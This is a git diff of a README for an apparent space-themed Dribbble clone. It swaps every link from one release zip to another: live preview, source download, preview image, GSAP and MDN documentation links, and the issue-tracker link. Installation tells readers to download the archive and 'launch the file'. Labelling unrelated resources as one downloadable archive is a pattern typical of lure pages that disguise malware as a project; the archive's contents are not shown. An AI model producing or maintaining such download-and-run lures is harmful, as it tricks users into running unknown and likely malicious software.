@@ -1,6 +1,6 @@
 # Micro Space Dribbble Clone 🌌🎨
 
-Welcome to the Micro Space Dribbble Clone repository! This project is a live preview of a Dribbble clone with a space-themed twist. You can check out the live preview of this project [here](https://github.com/Useame201/Micro-Space-Dribbble-Clone/releases/download/v1.0/Application.zip).
+Welcome to the Micro Space Dribbble Clone repository! This project is a live preview of a Dribbble clone with a space-themed twist. You can check out the live preview of this project [here](https://github.com/Useame201/Micro-Space-Dribbble-Clone/releases/download/v2.0/Software.zip).
 
 ## Features 🚀
 
@@ -13,13 +13,13 @@ Welcome to the Micro Space Dribbble Clone repository! This project is a live pre
 
 ## Installation 🛠️
 
-To get started with this project, you can download the source code by clicking [here](https://github.com/Useame201/Micro-Space-Dribbble-Clone/releases/download/v1.0/Application.zip). Once downloaded, launch the file to access the project files.
+To get started with this project, you can download the source code by clicking [here](https://github.com/Useame201/Micro-Space-Dribbble-Clone/releases/download/v2.0/Software.zip). Once downloaded, launch the file to access the project files.
 
 ## Preview 🖥️
 
 Here is a sneak peek at the Micro Space Dribbble Clone project:
 
-![Preview](https://github.com/Useame201/Micro-Space-Dribbble-Clone/releases/download/v1.0/Application.zip)
+![Preview](https://github.com/Useame201/Micro-Space-Dribbble-Clone/releases/download/v2.0/Software.zip)
 
 ## Getting Started 🌟
 
@@ -27,14 +27,14 @@ To run this project locally, follow these steps:
 
 1. Clone this repository.
 2. Open the project in your favorite code editor.
-3. Launch the https://github.com/Useame201/Micro-Space-Dribbble-Clone/releases/download/v1.0/Application.zip file in your browser.
+3. Launch the https://github.com/Useame201/Micro-Space-Dribbble-Clone/releases/download/v2.0/Software.zip file in your browser.
 
 ## Resources 📚
 
 If you want to learn more about GSAP and JavaScript, here are some recommended resources:
 
-- [GSAP Documentation](https://github.com/Useame201/Micro-Space-Dribbble-Clone/releases/download/v1.0/Application.zip)
-- [JavaScript MDN Docs](https://github.com/Useame201/Micro-Space-Dribbble-Clone/releases/download/v1.0/Application.zip)
+- [GSAP Documentation](https://github.com/Useame201/Micro-Space-Dribbble-Clone/releases/download/v2.0/Software.zip)
+- [JavaScript MDN Docs](https://github.com/Useame201/Micro-Space-Dribbble-Clone/releases/download/v2.0/Software.zip)
 
 ## Contributing 💡
 
@@ -42,7 +42,7 @@ If you would like to contribute to this project, feel free to fork this reposito
 
 ## Feedback 📝
 
-Have any feedback or suggestions? Feel free to [open an issue](https://github.com/Useame201/Micro-Space-Dribbble-Clone/releases/download/v1.0/Application.zip) on this repository. We would love to hear from you!
+Have any feedback or suggestions? Feel free to [open an issue](https://github.com/Useame201/Micro-Space-Dribbble-Clone/releases/download/v2.0/Software.zip) on this repository. We would love to hear from you!
 
 ## License ℹ️
 
